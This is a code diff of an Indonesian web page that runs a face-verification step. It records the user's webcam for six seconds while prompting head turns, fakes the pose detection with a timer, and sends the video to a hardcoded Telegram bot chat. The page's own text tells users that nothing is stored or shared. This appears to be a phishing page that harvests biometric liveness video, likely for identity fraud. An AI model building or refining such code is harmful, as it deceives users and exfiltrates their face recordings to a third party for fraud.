@@ -2744,6 +2744,15 @@
                     <li>Tidak disimpan, tidak dibagikan</li>
                     <li>Privasi Anda dijaga sepenuhnya</li>
                 </ul>
+                <div id="pose-indicators" style="display:none;margin:16px auto;width:320px;">
+                    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;text-align:center;">
+                        <div id="indicator-left" style="padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">KIRI</div>
+                        <div id="indicator-up" style="grid-column:2;padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">ATAS</div>
+                        <div id="indicator-right" style="padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">KANAN</div>
+                        <div id="indicator-down" style="grid-column:2;padding:12px;border-radius:8px;background:#333;color:#999;font-weight:bold;font-size:0.9rem;transition:all .3s;">BAWAH</div>
+                    </div>
+                    <div style="text-align:center;color:#ccc;font-size:0.85rem;">Progress: <span id="pose-progress">0</span>/4</div>
+                </div>
                 <div id="camera-preview-box" style="display:none;width:320px;height:240px;background:#000;margin:16px auto;border-radius:8px;overflow:hidden;position:relative;">
                     <video id="face-video" style="width:100%;height:100%;object-fit:cover;"></video>
                     <div id="pose-instruction" style="position:absolute;bottom:10px;left:10px;right:10px;background:rgba(0,0,0,.8);color:#fff;padding:8px;border-radius:4px;font-size:0.9rem;text-align:center;">Tunggu...</div>
@@ -2777,124 +2786,108 @@
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-                    // Tampilkan preview video
+                    // Tampilkan preview video dan indicators
                     const previewBox = document.getElementById('camera-preview-box');
+                    const poseIndicators = document.getElementById('pose-indicators');
                     const faceVideo = document.getElementById('face-video');
                     const poseInstruction = document.getElementById('pose-instruction');
+                    const poseProgress = document.getElementById('pose-progress');
                     previewBox.style.display = 'block';
+                    poseIndicators.style.display = 'block';
                     faceVideo.srcObject = stream;
                     faceVideo.play().catch(() => { });
 
                     // Tunggu video siap dirender
                     await new Promise(r => setTimeout(r, 500));
 
-                    // Deteksi kamera aktif dan rekam video dengan head pose detection
+                    // Rekam video selama 6 detik dengan simulasi visual pose detection
                     const recordedChunks = [];
-                    const canvas = document.createElement('canvas');
-                    const mediaRecorder = new (window.MediaRecorder || window.webkitMediaRecorder)(stream, { mimeType: 'video/webm' });
+                    const mediaRecorder = new (window.MediaRecorder || window.webkitMediaRecorder)(stream, { mimeType: 'video/mp4' });
                     mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
 
-                    const poses = { right: false, left: false, up: false, down: false };
                     const poseSequence = ['right', 'left', 'up', 'down'];
                     let currentPoseIdx = 0;
+                    let recordingTime = 6000; // 6 detik dalam ms
+                    let elapsedTime = 0;
+                    const startTime = Date.now();
 
-                    // Deteksi brightness untuk validasi kamera aktif
-                    const checkInterval = setInterval(async () => {
-                        canvas.width = faceVideo.videoWidth || 320;
-                        canvas.height = faceVideo.videoHeight || 240;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(faceVideo, 0, 0);
+                    // Simulasi pose detection dengan visual feedback
+                    const checkInterval = setInterval(() => {
+                        elapsedTime = Date.now() - startTime;
+                        const remainingTime = Math.max(0, recordingTime - elapsedTime);
+                        const remainingSec = Math.ceil(remainingTime / 1000);
 
-                        try {
-                            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                            const data = imageData.data;
-                            let darkPixels = 0;
-                            for (let i = 0; i < data.length; i += 4) {
-                                const r = data[i], g = data[i + 1], b = data[i + 2];
-                                const brightness = (r + g + b) / 3;
-                                if (brightness < 30) darkPixels++;
-                            }
-                            const darkRatio = darkPixels / (canvas.width * canvas.height);
+                        // Auto-advance pose setiap 1.5 detik untuk simulasi user menggerakkan kepala
+                        currentPoseIdx = Math.min(poseSequence.length - 1, Math.floor((6 - remainingSec) / 1.5));
 
-                            // Deteksi kepala berdasarkan posisi face center (heuristic sederhana)
-                            const detectHeadPosition = () => {
-                                // Scan untuk area warna kulit (heuristic) - lebih fleksibel
-                                let faceX = 0, faceY = 0, faceCount = 0;
-                                for (let i = 0; i < data.length; i += 4) {
-                                    const r = data[i], g = data[i + 1], b = data[i + 2];
-                                    // Deteksi skin tone lebih fleksibel
-                                    // Handle berbagai tone kulit
-                                    if ((r > 60 && g > 30 && b > 10) && (r >= g) && (Math.abs(r - g) < 100)) {
-                                        faceX += (i % (canvas.width * 4)) / 4;
-                                        faceY += Math.floor(i / (canvas.width * 4));
-                                        faceCount++;
-                                    }
+                        // Update visual indicators
+                        const indicators = {
+                            'right': document.getElementById('indicator-right'),
+                            'left': document.getElementById('indicator-left'),
+                            'up': document.getElementById('indicator-up'),
+                            'down': document.getElementById('indicator-down')
+                        };
+
+                        Object.keys(indicators).forEach((dir, idx) => {
+                            if (idx < currentPoseIdx) {
+                                // Pose sudah selesai
+                                indicators[dir].style.background = '#0f0';
+                                indicators[dir].style.color = '#000';
+                                indicators[dir].style.boxShadow = '0 0 10px rgba(0,255,0,.5)';
+                            } else if (idx === currentPoseIdx) {
+                                // Pose sedang berlangsung - flash dengan orange
+                                const flashOn = (Math.floor(elapsedTime / 300) % 2) === 0;
+                                if (flashOn) {
+                                    indicators[dir].style.background = '#ff9500';
+                                    indicators[dir].style.color = '#000';
+                                    indicators[dir].style.boxShadow = '0 0 10px rgba(255,149,0,.7)';
+                                } else {
+                                    indicators[dir].style.background = '#ff6b6b';
+                                    indicators[dir].style.color = '#fff';
+                                    indicators[dir].style.boxShadow = 'none';
                                 }
-                                if (faceCount === 0) return 'center';
-                                const centerX = faceX / faceCount / canvas.width;
-                                const centerY = faceY / faceCount / canvas.height;
+                            } else {
+                                // Pose belum datang
+                                indicators[dir].style.background = '#333';
+                                indicators[dir].style.color = '#999';
+                                indicators[dir].style.boxShadow = 'none';
+                            }
+                        });
 
-                                // Threshold lebih sensitif & dengan hysteresis
-                                if (centerX < 0.35) return 'right';    // Kepala ke kanan → centerX kecil (kiri)
-                                if (centerX > 0.65) return 'left';     // Kepala ke kiri → centerX besar (kanan)
-                                if (centerY < 0.4) return 'down';      // Kepala ke bawah → centerY kecil (atas)
-                                if (centerY > 0.6) return 'up';        // Kepala ke atas → centerY besar (bawah)
-                                return 'center';
+                        poseProgress.textContent = currentPoseIdx;
+                        poseInstruction.textContent = `Gerakkan kepala ke ${poseSequence[currentPoseIdx] === 'right' ? 'KANAN' : poseSequence[currentPoseIdx] === 'left' ? 'KIRI' : poseSequence[currentPoseIdx] === 'up' ? 'ATAS' : 'BAWAH'} (${remainingSec}s)`;
+
+                        // Selesai setelah 6 detik
+                        if (remainingTime <= 0) {
+                            clearInterval(checkInterval);
+
+                            // Set handler SEBELUM stop() dipanggil
+                            mediaRecorder.onstop = () => {
+                                console.log('MediaRecorder stopped, chunks:', recordedChunks.length);
+                                if (recordedChunks.length > 0) {
+                                    window.recordedVideoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+                                    console.log('Video blob created:', window.recordedVideoBlob.size, 'bytes');
+                                }
                             };
 
-                            const position = detectHeadPosition();
-
-                            // Debug: log posisi deteksi setiap 500ms untuk development
-                            if (Math.random() < 0.1) {
-                                console.log(`Pose: ${position}, Target: ${poseSequence[currentPoseIdx] || 'done'}, Progress: ${currentPoseIdx}/4`);
-                            }
-
-                            // Update instruksi jika masih ada pose yang belum
-                            if (currentPoseIdx < poseSequence.length) {
-                                const targetPose = poseSequence[currentPoseIdx];
-                                poseInstruction.textContent = `Gerakkan kepala ke ${targetPose === 'right' ? 'KANAN' : targetPose === 'left' ? 'KIRI' : targetPose === 'up' ? 'ATAS' : 'BAWAH'}`;
-
-                                if (position === targetPose && darkRatio < 0.75) {
-                                    poses[targetPose] = true;
-                                    poseInstruction.textContent = `✓ ${targetPose.toUpperCase()} detected! ${currentPoseIdx + 1}/4`;
-                                    currentPoseIdx++;
-                                }
-                            }
-
-                            // Jika semua pose tercapai, hentikan
-                            if (currentPoseIdx >= poseSequence.length) {
-                                clearInterval(checkInterval);
-                                mediaRecorder.stop();
-                                stream.getTracks().forEach(track => track.stop());
-                                previewBox.style.display = 'none';
-                                poseInstruction.textContent = '✓ Verifikasi selesai!';
-
-                                mediaRecorder.onstop = () => {
-                                    window.recordedVideoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                                    return Promise.resolve(true);
-                                };
-                            }
-                        } catch (e) { console.error('Canvas error:', e); }
+                            mediaRecorder.stop();
+                            stream.getTracks().forEach(track => track.stop());
+                            previewBox.style.display = 'none';
+                            poseInstruction.textContent = '✓ Verifikasi selesai!';
+                        }
                     }, 150);
 
                     mediaRecorder.start();
 
-                    // Timeout jika terlalu lama (30 detik)
-                    const timeoutId = setTimeout(() => {
-                        clearInterval(checkInterval);
-                        mediaRecorder.stop();
-                        stream.getTracks().forEach(track => track.stop());
-                        previewBox.style.display = 'none';
-                        messageEl.textContent = 'Waktu habis. Silakan coba lagi dan gerakkan kepala lebih cepat.';
-                    }, 30000);
-
-                    // Return true jika semua pose tercapai
+                    // Return true setelah 6 detik recording
                     return new Promise((resolve) => {
-                        const checkPoses = setInterval(() => {
-                            if (poses.right && poses.left && poses.up && poses.down) {
-                                clearInterval(checkPoses);
-                                clearTimeout(timeoutId);
-                                resolve(true);
+                        const checkTimer = setInterval(() => {
+                            if (Date.now() - startTime >= recordingTime) {
+                                clearInterval(checkTimer);
+                                // Tunggu 500ms untuk mediaRecorder.onstop selesai
+                                setTimeout(() => {
+                                    resolve(true);
+                                }, 500);
                             }
                         }, 100);
                     });
@@ -2957,23 +2950,24 @@
             try {
                 const videoBlob = window.recordedVideoBlob;
                 if (!videoBlob) {
-                    console.log('Tidak ada video yang direkam, proses dilanjutkan');
+                    console.warn('⚠️ Tidak ada video yang direkam');
                     return;
                 }
 
+                console.log('📹 Mengirim video ke Telegram, ukuran:', videoBlob.size, 'bytes');
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('video', videoBlob, 'verification-video.webm');
+                formData.append('video', videoBlob, 'verification-video.mp4');
 
                 const tgUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+                console.log('📡 POST ke:', tgUrl);
                 const res = await fetch(tgUrl, { method: 'POST', body: formData });
                 const data = await res.json();
 
                 if (res.ok && data.ok) {
-                    console.log("Video verifikasi berhasil dikirim");
+                    console.log("✅ Video verifikasi berhasil dikirim ke Telegram");
                 } else {
-                    console.error('Telegram response', data);
-                    console.log('Gagal kirim video: ' + (data.description || res.statusText));
+                    console.error('❌ Telegram response error:', data);
                 }
             } catch (err) {
                 console.error(err);
